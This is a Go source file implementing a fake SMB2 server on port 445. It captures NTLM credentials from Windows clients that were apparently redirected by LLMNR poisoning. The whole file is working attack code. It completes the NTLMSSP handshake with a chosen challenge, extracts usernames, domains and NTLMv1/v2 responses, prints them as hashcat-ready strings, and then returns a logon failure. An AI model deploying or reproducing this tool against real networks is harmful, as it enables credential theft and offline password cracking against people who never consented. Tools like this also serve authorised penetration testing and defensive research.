// Package smb implements a fake SMB2 server that captures NTLM credentials.
//
// Flow:
//
//  1. Client (Windows) connects to TCP :445 after being poisoned by LLMNR.
//  2. (Optional) NetBIOS session request (\x81) → reply \x82\x00\x00\x00.
//  3. SMBv1 NEGOTIATE with "SMB 2.???" dialect → we upgrade to SMBv2.
//  4. SMBv2 NEGOTIATE → we advertise dialect 0x0210 (SMB 2.1).
//  5. SMBv2 SESSION SETUP (NTLMSSP_NEGOTIATE) → we issue NTLMSSP_CHALLENGE.
//  6. SMBv2 SESSION SETUP (NTLMSSP_AUTH) → parse & print hash, reply LOGON_FAILURE.
package smb

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

const (
	Port = 445

	smb2CmdNegotiate    = uint16(0x0000)
	smb2CmdSessionSetup = uint16(0x0001)

	// NTStatus codes (little-endian as sent on the wire)
	statusMoreProcessing = uint32(0xC0000016) // STATUS_MORE_PROCESSING_REQUIRED
	statusLogonFailure   = uint32(0xC000006D) // STATUS_LOGON_FAILURE

	// Fake server identity
	fakeDomain      = "WORKGROUP"
	fakeWorkstation = "DESKTOP"
)

// ─────────────────────────────────────────────────────── Capture ──────────

// Capture holds one captured NTLM credential set.
type Capture struct {
	Type     string // "NTLMv2-SSP" or "NTLMv1-SSP"
	Client   string // victim IP
	Username string // DOMAIN\username
	FullHash string // hashcat-ready string
}

// Print outputs the capture.
func (c *Capture) Print() {
	fmt.Printf("\x1b[93m[SMB]\x1b[0m %s Client   : %s\n", c.Type, c.Client)
	fmt.Printf("\x1b[93m[SMB]\x1b[0m %s Username : %s\n", c.Type, c.Username)
	fmt.Printf("\x1b[93m[SMB]\x1b[0m %s Hash     : %s\n", c.Type, c.FullHash)
}

// ─────────────────────────────────────────────────────── Server ───────────

// Server is the fake SMB2 listener.
type Server struct {
	// OnCapture is called (from a goroutine) whenever a hash is captured.
	// If nil, Capture.Print() is called automatically.
	OnCapture func(*Capture)
}

// Run starts listening on TCP :445 and blocks until an error occurs.
func (s *Server) Run() error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", Port))
	if err != nil {
		return fmt.Errorf("listen tcp :%d: %w", Port, err)
	}
	defer ln.Close()
	fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  Server active on 0.0.0.0:%d\n", Port)

	for {
		conn, err := ln.Accept()
		if err != nil {
			return err
		}
		go s.handle(conn)
	}
}

// handle drives one SMB connection through the negotiate→challenge→auth sequence.
func (s *Server) handle(conn net.Conn) {
	defer conn.Close()

	var challenge [8]byte
	rand.Read(challenge[:])
	clientIP := remoteIP(conn)

	fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  Connection from %s\n", clientIP)

	// ── Read first raw bytes ────────────────────────────────────────────────
	data, err := rawRead(conn)
	if err != nil {
		fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Read error (initial) from %s: %v\n", clientIP, err)
		return
	}

	// ── Handle NetBIOS Session Request (\x81) ──────────────────────────────
	// Send \x82\x00\x00\x00 then read next packet.
	if len(data) > 0 && data[0] == 0x81 {
		fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  NetBIOS session request from %s\n", clientIP)
		conn.Write([]byte{0x82, 0x00, 0x00, 0x00})
		data, err = rawRead(conn)
		if err != nil {
			fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Read error after session req from %s: %v\n", clientIP, err)
			return
		}
	}

	// ── Step 1: SMBv1 NEGOTIATE with "SMB 2.???" upgrade ──────────────────
	if isSMB1Negotiate(data) && bytes.Contains(data, []byte("SMB 2.???")) {
		fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  SMBv1 negotiate from %s, sending SMBv2 upgrade\n", clientIP)
		hdr  := smb2Hdr(smb2CmdNegotiate, 0, make([]byte, 8), make([]byte, 8), 1)
		resp := append(hdr, buildNegoBody(0x02FF)...)
		if netbiosWrite(conn, resp) != nil {
			return
		}
		data, err = rawRead(conn)
		if err != nil {
			fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Read error after upgrade from %s: %v\n", clientIP, err)
			return
		}
	}

	// ── Step 2: SMBv2 NEGOTIATE ─────────────────────────────────────────────
	if isSMB2(data) && smb2Command(data) == smb2CmdNegotiate {
		fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  SMBv2 NEGOTIATE from %s\n", clientIP)
		hdr  := smb2Hdr(smb2CmdNegotiate, 0, smb2MsgID(data), make([]byte, 8), smb2Credits(data))
		resp := append(hdr, buildNegoBody(0x0210)...)
		if netbiosWrite(conn, resp) != nil {
			return
		}
		data, err = rawRead(conn)
		if err != nil {
			fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Read error after negotiate from %s: %v\n", clientIP, err)
			return
		}
	}

	// ── Step 3: SESSION SETUP 1 — NTLMSSP_NEGOTIATE ──────────────────────
	if !isSMB2(data) || smb2Command(data) != smb2CmdSessionSetup {
		fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Unexpected packet from %s (expected SESSION SETUP): smb2=%v cmd=%04x\n",
			clientIP, isSMB2(data), smb2CommandSafe(data))
		return
	}
	fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  SESSION SETUP 1 (NTLMSSP_NEGOTIATE) from %s\n", clientIP)
	rand.Read(challenge[:]) // fresh challenge per connection

	ntlmMsg := buildNTLMChallenge(challenge)
	spnego  := wrapSPNEGO(ntlmMsg)
	hdr     := smb2Hdr(smb2CmdSessionSetup, statusMoreProcessing, smb2MsgID(data), smb2SessID(data), smb2Credits(data))
	resp    := append(hdr, buildSessBody1(spnego)...)
	if netbiosWrite(conn, resp) != nil {
		return
	}

	// ── Step 4: SESSION SETUP 2 — NTLMSSP_AUTH ───────────────────────────
	data, err = rawRead(conn)
	if err != nil {
		fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Read error after challenge from %s: %v\n", clientIP, err)
		return
	}
	if !isSMB2(data) || smb2Command(data) != smb2CmdSessionSetup {
		fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  Expected NTLMSSP_AUTH from %s, got cmd=%04x\n", clientIP, smb2CommandSafe(data))
		return
	}
	fmt.Printf("[*] \x1b[93m[SMB]\x1b[0m  SESSION SETUP 2 (NTLMSSP_AUTH) from %s (%d bytes)\n", clientIP, len(data))

	cap := parseNTLMAuth(data, clientIP, challenge)
	if cap != nil {
		if s.OnCapture != nil {
			s.OnCapture(cap)
		} else {
			cap.Print()
		}
	} else {
		// Debug: help diagnose parse failures
		if idx := bytes.Index(data, []byte("NTLMSSP\x00")); idx >= 0 {
			msgType := binary.LittleEndian.Uint32(data[idx+8 : idx+12])
			ntLen   := binary.LittleEndian.Uint16(data[idx+20 : idx+22])
			fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  NTLMSSP found at +%d msgType=%d ntLen=%d (parse failed)\n",
				idx, msgType, ntLen)
		} else {
			fmt.Printf("[!] \x1b[93m[SMB]\x1b[0m  NTLMSSP signature not found in AUTH packet from %s\n", clientIP)
		}
	}

	// Reply with LOGON_FAILURE so Windows doesn't cache a session.
	hdr2  := smb2Hdr(smb2CmdSessionSetup, statusLogonFailure, smb2MsgID(data), smb2SessID(data), smb2Credits(data))
	resp2 := append(hdr2, buildSessBody2()...)
	netbiosWrite(conn, resp2) //nolint:errcheck
}

// ─────────────────────────────────────────────── Packet builders ──────

// smb2Hdr builds a 64-byte SMB2 response header.
func smb2Hdr(cmd uint16, status uint32, msgID, sessID []byte, credits uint16) []byte {
	h := make([]byte, 64)
	copy(h[0:4], []byte{0xfe, 0x53, 0x4d, 0x42}) // ProtocolId "\xfeSMB"
	binary.LittleEndian.PutUint16(h[4:], 64)       // StructureSize = 64
	// h[6:8]  CreditCharge = 0
	binary.LittleEndian.PutUint32(h[8:], status)
	binary.LittleEndian.PutUint16(h[12:], cmd)
	binary.LittleEndian.PutUint16(h[14:], credits)
	binary.LittleEndian.PutUint32(h[16:], 1) // Flags: SMB2_FLAGS_SERVER_TO_REDIR
	// h[20:24] NextCommand = 0
	copy(h[24:32], msgID)                           // MessageId (8 bytes, echoed)
	copy(h[32:36], []byte{0xff, 0xfe, 0x00, 0x00}) // ProcessId
	// h[36:40] TID = 0
	if len(sessID) >= 8 {
		copy(h[40:48], sessID) // SessionId
	}
	// h[48:64] Signature = 0
	return h
}

// buildNegoSPNEGO builds the SPNEGO InitialContextToken for the NEGOTIATE response.
// MS-KRB5, KRB5, KRB5-legacy, NTLM mechTypes followed by the RFC 4178 negHints string.
func buildNegoSPNEGO() []byte {
	msKrb5    := []byte{0x2a, 0x86, 0x48, 0x82, 0xf7, 0x12, 0x01, 0x02, 0x02}       // 9 bytes
	krb5      := []byte{0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}        // 9 bytes
	krb5Leg   := []byte{0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02, 0x03} // 10 bytes
	ntlm      := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a} // 10 bytes
	spnegoOID := []byte{0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}                           // 6 bytes

	mechs := asn1(0x06, msKrb5)
	mechs  = append(mechs, asn1(0x06, krb5)...)
	mechs  = append(mechs, asn1(0x06, krb5Leg)...)
	mechs  = append(mechs, asn1(0x06, ntlm)...)

	mechTypes := asn1(0xa0, asn1(0x30, mechs))
	hint      := []byte("not_defined_in_RFC4178@please_ignore")
	negHints  := asn1(0xa3, asn1(0x30, asn1(0xa0, asn1(0x1b, hint))))

	negTokenInit := append(mechTypes, negHints...)
	negoToken    := asn1(0xa0, asn1(0x30, negTokenInit))
	inner        := append(asn1(0x06, spnegoOID), negoToken...)
	return asn1(0x60, inner)
}

// buildNegoBody builds the SMB2 NEGOTIATE response body (MS-SMB2 §2.2.4).
//
// SecurityBufferOffset = 64 (SMB2 header) + 64 (fixed body) = 128 = 0x80.
func buildNegoBody(dialect uint16) []byte {
	spnego := buildNegoSPNEGO()

	guid := make([]byte, 16)
	rand.Read(guid)
	now := winTime()

	b := make([]byte, 0, 64+len(spnego))
	b = append(b, u16(65)...)              // StructureSize (always 65)
	b = append(b, 0x01, 0x00)             // SecurityMode: signing enabled
	b = append(b, u16(dialect)...)        // DialectRevision
	b = append(b, 0x00, 0x00)             // Reserved
	b = append(b, guid...)                // ServerGuid (16 bytes)
	b = append(b, 0x07, 0x00, 0x00, 0x00) // Capabilities
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxTransactSize
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxReadSize
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxWriteSize
	b = append(b, now...)                 // SystemTime
	b = append(b, now...)                 // ServerStartTime
	// SecurityBufferOffset: 64 (SMB2 header) + 64 (body fixed part) = 128 = 0x80
	b = append(b, 0x80, 0x00)                       // SecurityBufferOffset
	b = append(b, u16(uint16(len(spnego)))...)       // SecurityBufferLength
	b = append(b, 0x00, 0x00, 0x00, 0x00)           // Reserved2
	b = append(b, spnego...)
	return b
}

// buildSessBody1 builds the SMB2 SESSION SETUP response body carrying the
// NTLMSSP CHALLENGE inside a SPNEGO NegTokenResp (MS-SMB2 §2.2.6).
//
// SecurityBufferOffset = 64 (SMB2 header) + 8 (fixed body) = 72 = 0x48.
func buildSessBody1(spnego []byte) []byte {
	b := make([]byte, 0, 8+len(spnego))
	b = append(b, u16(9)...)                         // StructureSize
	b = append(b, 0x00, 0x00)                        // SessionFlags
	b = append(b, 0x48, 0x00)                        // SecurityBufferOffset = 72
	b = append(b, u16(uint16(len(spnego)))...)
	b = append(b, spnego...)
	return b
}

// buildSessBody2 builds the SESSION SETUP error body for LOGON_FAILURE.
func buildSessBody2() []byte {
	b := u16(9)              // StructureSize
	b  = append(b, 0x00, 0x00) // SessionFlags
	b  = append(b, 0x00, 0x00) // SecurityBufferOffset = 0
	b  = append(b, 0x00, 0x00) // SecurityBufferLength = 0
	return b
}

// ─────────────────────────────────────────────── NTLMSSP / SPNEGO ────

// buildNTLMChallenge constructs an NTLMSSP_CHALLENGE (Type 2) message.
func buildNTLMChallenge(challenge [8]byte) []byte {
	domain := utf16LE(fakeDomain)

	// AvPairs (MS-NLMP §2.2.2.1)
	av := avPair(0x0002, utf16LE(fakeDomain))                              // MsvAvNbDomainName
	av  = append(av, avPair(0x0001, utf16LE(fakeWorkstation))...)          // MsvAvNbComputerName
	av  = append(av, avPair(0x0004, utf16LE(fakeWorkstation+".local"))...) // MsvAvDnsDomainName
	av  = append(av, avPair(0x0003, utf16LE("local"))...)                  // MsvAvDnsComputerName
	av  = append(av, avPair(0x0005, utf16LE("local"))...)                  // MsvAvDnsTreeName
	av  = append(av, avPair(0x0007, winTime())...)                         // MsvAvTimestamp
	av  = append(av, 0x00, 0x00, 0x00, 0x00)                              // MsvAvEOL

	// NTLMSSP_CHALLENGE fixed header = 56 bytes:
	// Signature(8)+MsgType(4)+TargetNameBuf(8)+Flags(4)+Challenge(8)+Reserved(8)+TargetInfoBuf(8)+Version(8)
	const hdrSize = 56
	domOff := uint32(hdrSize)
	avOff  := domOff + uint32(len(domain))

	m := []byte("NTLMSSP\x00")
	m  = append(m, u32(2)...)                     // MessageType = 2
	m  = append(m, u16(uint16(len(domain)))...)   // TargetName.Len
	m  = append(m, u16(uint16(len(domain)))...)   // TargetName.MaxLen
	m  = append(m, u32(domOff)...)                // TargetName.Offset
	m  = append(m, 0x15, 0x82, 0x89, 0xe2)       // NegotiateFlags
	m  = append(m, challenge[:]...)               // ServerChallenge
	m  = append(m, 0, 0, 0, 0, 0, 0, 0, 0)      // Reserved
	m  = append(m, u16(uint16(len(av)))...)       // TargetInfo.Len
	m  = append(m, u16(uint16(len(av)))...)       // TargetInfo.MaxLen
	m  = append(m, u32(avOff)...)                 // TargetInfo.Offset
	// Version: Windows 6.1.7601 (Win7), NTLM revision 15
	m  = append(m, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f)
	m  = append(m, domain...)
	m  = append(m, av...)
	return m
}

// wrapSPNEGO wraps an NTLMSSP message in a SPNEGO NegTokenResp (RFC 4178 §4.2.2).
func wrapSPNEGO(ntlmMsg []byte) []byte {
	ntlmOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

	state := asn1(0xa0, asn1(0x0a, []byte{0x01})) // accept-incomplete
	mech  := asn1(0xa1, asn1(0x06, ntlmOID))       // supportedMech
	token := asn1(0xa2, asn1(0x04, ntlmMsg))        // responseToken

	inner := append(state, mech...)
	inner  = append(inner, token...)
	return asn1(0xa1, asn1(0x30, inner))
}

// ────────────────────────────────────────── NTLMSSP_AUTH parser ─────────

// parseNTLMAuth function.
func parseNTLMAuth(data []byte, clientIP string, challenge [8]byte) *Capture {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx < 0 || len(data)-idx < 44 {
		return nil
	}
	n := data[idx:] // NTLMSSP slice

	// MessageType must be 3 (NTLMSSP_AUTH)
	if binary.LittleEndian.Uint32(n[8:12]) != 3 {
		return nil
	}

	// Security buffer descriptors
	lmLen  := int(binary.LittleEndian.Uint16(n[14:16]))
	lmOff  := int(binary.LittleEndian.Uint16(n[16:18]))
	ntLen  := int(binary.LittleEndian.Uint16(n[20:22]))
	ntOff  := int(binary.LittleEndian.Uint16(n[24:26]))
	domLen := int(binary.LittleEndian.Uint16(n[30:32]))
	domOff := int(binary.LittleEndian.Uint16(n[32:34]))
	usrLen := int(binary.LittleEndian.Uint16(n[38:40]))
	usrOff := int(binary.LittleEndian.Uint16(n[40:42]))

	if oob(n, ntOff, ntLen) || oob(n, domOff, domLen) || oob(n, usrOff, usrLen) {
		return nil
	}

	ntHash  := n[ntOff : ntOff+ntLen]
	domain  := decodeUTF16LE(n[domOff : domOff+domLen])
	username := decodeUTF16LE(n[usrOff : usrOff+usrLen])

	if len(username) < 2 {
		return nil
	}

	challHex := hex.EncodeToString(challenge[:])
	ntHex    := strings.ToUpper(hex.EncodeToString(ntHash))

	var hashType, fullHash string
	switch {
	case ntLen > 60: // NTLMv2 — NTProofStr (16 B) + blob
		hashType = "NTLMv2-SSP"
		fullHash = fmt.Sprintf("%s::%s:%s:%s:%s",
			username, domain, challHex, ntHex[:32], ntHex[32:])

	case ntLen == 24: // NTLMv1
		lmHex := strings.ToUpper(hex.EncodeToString(n[lmOff : lmOff+lmLen]))
		hashType = "NTLMv1-SSP"
		fullHash = fmt.Sprintf("%s::%s:%s:%s:%s",
			username, domain, lmHex, ntHex, challHex)

	default:
		return nil
	}

	return &Capture{
		Type:     hashType,
		Client:   clientIP,
		Username: domain + `\` + username,
		FullHash: fullHash,
	}
}

// ──────────────────────────────────────────── NetBIOS / IO helpers ────

// rawRead reads one message from the TCP stream.
//
// Port 445 (direct SMB) uses 4-byte NetBIOS framing.
// We return the full buffer including the 4-byte header so that byte
// offsets (data[4], data[8], etc.) match data[N] indexing.
func rawRead(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if err := readAll(conn, hdr); err != nil {
		return nil, err
	}
	// NetBIOS session message: type byte 0 (or 0x81 for session request).
	// Length is encoded in bytes [1:4] (big-endian, 3 bytes).
	length := int(hdr[1])<<16 | int(hdr[2])<<8 | int(hdr[3])
	if length == 0 {
		return hdr, nil
	}
	body := make([]byte, length)
	if err := readAll(conn, body); err != nil {
		return nil, err
	}
	return append(hdr, body...), nil
}

// netbiosWrite sends data with a 4-byte NetBIOS session message header.
func netbiosWrite(conn net.Conn, data []byte) error {
	frame := make([]byte, 4+len(data))
	frame[0] = 0x00 // type: session message
	frame[1] = byte(len(data) >> 16)
	frame[2] = byte(len(data) >> 8)
	frame[3] = byte(len(data))
	copy(frame[4:], data)
	_, err := conn.Write(frame)
	return err
}

func readAll(conn net.Conn, buf []byte) error {
	for got := 0; got < len(buf); {
		n, err := conn.Read(buf[got:])
		got += n
		if err != nil && got < len(buf) {
			return err
		}
	}
	return nil
}

// ─────────────────────────────────────── SMB2 field accessor helpers ────

// isSMB1Negotiate returns true for an SMBv1 NEGOTIATE command.
func isSMB1Negotiate(data []byte) bool {
	return len(data) > 9 && data[4] == 0xff && data[8] == 0x72
}

// isSMB2 returns true when data carries an SMBv2 packet.
func isSMB2(data []byte) bool {
	return len(data) > 18 && data[4] == 0xfe
}

// smb2Command returns the SMBv2 Command field (bytes 16-17 with NetBIOS prefix).
func smb2Command(data []byte) uint16 {
	return binary.LittleEndian.Uint16(data[16:18])
}

// smb2CommandSafe returns the SMBv2 Command or 0xFFFF if data is too short.
func smb2CommandSafe(data []byte) uint16 {
	if len(data) < 18 {
		return 0xFFFF
	}
	return binary.LittleEndian.Uint16(data[16:18])
}

// smb2MsgID returns the 8-byte SMBv2 MessageId (bytes 28-35), used for echo.
func smb2MsgID(data []byte) []byte {
	if len(data) < 36 {
		return make([]byte, 8)
	}
	cp := make([]byte, 8)
	copy(cp, data[28:36])
	return cp
}

// smb2SessID returns the 8-byte SessionId (bytes 44-51).
func smb2SessID(data []byte) []byte {
	if len(data) < 52 {
		return make([]byte, 8)
	}
	cp := make([]byte, 8)
	copy(cp, data[44:52])
	return cp
}

// smb2Credits returns the client's credit request, minimum 1.
func smb2Credits(data []byte) uint16 {
	if len(data) < 20 {
		return 1
	}
	v := binary.LittleEndian.Uint16(data[18:20])
	if v == 0 {
		return 1
	}
	return v
}

// ──────────────────────────────────────────── Encoding helpers ────────

func utf16LE(s string) []byte {
	b := make([]byte, 0, len(s)*2)
	for _, r := range s {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(binary.LittleEndian.Uint16(b[i*2:]))
	}
	return string(runes)
}

func u16(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }
func u32(v uint32) []byte { b := make([]byte, 4); binary.LittleEndian.PutUint32(b, v); return b }

func winTime() []byte {
	delta := time.Since(time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC))
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, uint64(delta.Nanoseconds()/100))
	return b
}

func avPair(id uint16, value []byte) []byte {
	b := u16(id)
	b  = append(b, u16(uint16(len(value)))...)
	return append(b, value...)
}

// asn1 wraps data with a BER tag+length prefix.
func asn1(tag byte, data []byte) []byte {
	out := []byte{tag}
	n := len(data)
	switch {
	case n <= 0x7f:
		out = append(out, byte(n))
	case n <= 0xff:
		out = append(out, 0x81, byte(n))
	default:
		out = append(out, 0x82, byte(n>>8), byte(n))
	}
	return append(out, data...)
}

func oob(s []byte, off, length int) bool {
	return off < 0 || length < 0 || off+length > len(s)
}

func remoteIP(conn net.Conn) string {
	addr := conn.RemoteAddr().String()
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr
	}
	return strings.TrimPrefix(host, "::ffff:")
}
